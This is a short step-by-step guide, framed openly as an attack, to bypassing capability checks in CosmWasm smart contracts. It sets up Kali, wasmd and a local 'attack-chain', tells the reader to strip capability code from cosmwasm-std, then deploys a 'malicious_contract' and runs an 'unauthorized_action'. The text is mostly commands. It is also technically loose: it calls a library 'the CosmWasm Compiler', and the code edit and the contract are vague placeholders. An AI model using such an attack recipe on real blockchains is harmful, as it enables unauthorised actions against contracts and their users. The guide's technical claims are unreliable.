# Exploiting Capability Bypass


## Step 1: Set Up Development Environment
Ensure your Kali Linux machine has the necessary dependencies installed.

### Install Rust and CosmWasm Tools
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
rustup default stable
rustup target add wasm32-unknown-unknown

### Install Wasmd (CosmWasm Binary)
git clone https://github.com/CosmWasm/wasmd.git
cd wasmd
git checkout v0.30.0 # Choose a stable version
make build
sudo mv build/wasmd /usr/local/bin/

### Verify Installation
wasmd version

---

## Step 2: Set Up a Local Blockchain for Testing

### Initialize the Chain
wasmd init attacker-node --chain-id attack-chain

### Create and Fund an Account
wasmd keys add attacker
wasmd add-genesis-account $(wasmd keys show attacker -a) 100000000stake
wasmd gentx attacker 100000000stake --chain-id attack-chain
wasmd collect-gentxs
wasmd start

---

## Step 3: Modify CosmWasm to Bypass Capabilities

### Clone the CosmWasm Repository
git clone https://github.com/CosmWasm/cosmwasm.git
cd cosmwasm

### Modify the Compiler to Bypass Capability Checks
- Open cosmwasm-std/src/capabilities.rs
- Locate the section that generates the capabilities string.
- Comment out or remove the part that sets the required capabilities:

// Do not set required capabilities
// let required_capabilities = ...

### Recompile the CosmWasm Compiler
cargo build --release --target wasm32-unknown-unknown

---

## Step 4: Deploy the Malicious Contract

### Compile a Minimal Malicious Contract
cargo wasm

### Deploy the Contract
wasmd tx wasm store target/wasm32-unknown-unknown/release/malicious_contract.wasm --from attacker --gas auto --fees 5000stake --chain-id attack-chain -y

### Instantiate the Contract
wasmd tx wasm instantiate <CODE_ID> '{}' --from attacker --label "malicious_contract" --no-admin --gas auto --fees 5000stake --chain-id attack-chain -y

### Execute Unauthorized Actions
wasmd tx wasm execute <CONTRACT_ADDRESS> '{"unauthorized_action": {}}' --from attacker --gas auto --fees 5000stake --chain-id attack-chain -y

